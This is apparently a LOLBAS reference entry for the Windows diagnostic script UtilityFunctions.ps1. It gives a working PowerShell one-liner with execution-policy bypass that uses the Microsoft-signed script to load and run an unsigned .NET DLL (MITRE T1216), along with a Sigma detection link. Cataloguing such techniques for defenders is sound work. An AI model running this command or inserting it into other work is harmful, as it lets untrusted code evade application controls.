---
Acknowledgement:
- Person: Nick VanGil
Author: Jimmy (@bohops)
Commands:
- Category: Execute
  Command: powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking;
    import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
  Description: Proxy execute Managed DLL with PowerShell
  MitreID: T1216
  OperatingSystem: Windows 10 21H1 (likely other versions as well), Windows 11
  Privileges: User
  Tags:
  - Execute: DLL (.NET)
  Usecase: Execute proxied payload with Microsoft signed binary
Created: 2021-09-26
Description: PowerShell Diagnostic Script
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/0.21-688-gd172b136b/rules/windows/process_creation/proc_creation_win_lolbas_utilityfunctions.yml
Full_Path:
- Path: C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1
Name: UtilityFunctions.ps1
Resources:
- Link: https://twitter.com/nickvangilder/status/1441003666274668546
mitre_data:
  technique_ids:
  - T1216
tags:
- lolbas/osscripts
---

# UtilityFunctions.ps1

PowerShell Diagnostic Script

# Path(s)

- `C:\Windows\diagnostics\system\Networking\UtilityFunctions.ps1`

# Execute Commands

Proxy execute Managed DLL with PowerShell

```batch
powershell.exe -ep bypass -command "set-location -path c:\windows\diagnostics\system\networking; import-module .\UtilityFunctions.ps1; RegSnapin ..\..\..\..\temp\unsigned.dll;[Program.Class]::Main()"
```

- **Usecase:** Execute proxied payload with Microsoft signed binary
- **Privileges Required:** User
- **MitreID:** `T1216`
- **Operating System(s):** Windows 10 21H1 (likely other versions as well), Windows 11



# Resource(s)

- https://twitter.com/nickvangilder/status/1441003666274668546
# Acknowledgements

- Jimmy (@bohops) (Authored, 2021-09-26)
- Nick VanGil